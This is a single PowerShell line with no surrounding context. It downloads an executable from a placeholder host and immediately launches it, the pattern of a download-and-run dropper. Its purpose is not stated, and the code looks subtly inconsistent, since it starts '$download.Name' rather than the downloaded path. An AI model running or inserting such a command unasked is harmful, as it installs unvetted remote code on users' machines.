(New-Object System.Net.WebClient).DownloadFile('https://downloads.example.invalid/client.exe', $download); Start-Process $download.Name
